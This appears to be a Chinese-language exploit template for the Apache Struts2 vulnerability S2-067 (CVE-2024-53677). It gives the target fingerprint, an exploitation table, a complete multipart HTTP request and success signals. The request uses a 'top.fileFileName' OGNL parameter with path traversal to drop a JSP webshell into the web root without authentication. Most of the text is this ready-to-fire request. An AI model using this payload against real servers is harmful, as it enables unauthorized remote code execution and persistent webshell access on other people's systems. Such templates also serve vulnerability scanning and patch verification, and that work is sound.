# S2-067 OGNL 注入 RCE (CVE-2024-53677)

## 指纹特征
- 服务: Apache Struts2
- 场景: 绕过 S2-066 补丁后的 OGNL 注入

## 利用矩阵
| 触发方式 | 路径 | 权限要求 |
| :--- | :--- | :--- |
| 文件名 OGNL 注入 | `/index.action` | 无 |

## PoC 指令

通过在上传参数键中使用 `top.fileFileName` OGNL 表达式：

```http
POST /index.action HTTP/1.1
Host: {{TARGET}}:8080
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="file"; filename="shell.jsp"
Content-Type: text/plain

<% out.println("shell"); %>
------Boundary
Content-Disposition: form-data; name="top.fileFileName"

../shell.jsp
------Boundary--
```

## Success Signal
- **物理验证**: Webshell 被上传至根目录 (如 `/shell.jsp`)。
- **状态验证**: 成功访问 Webshell 路径。
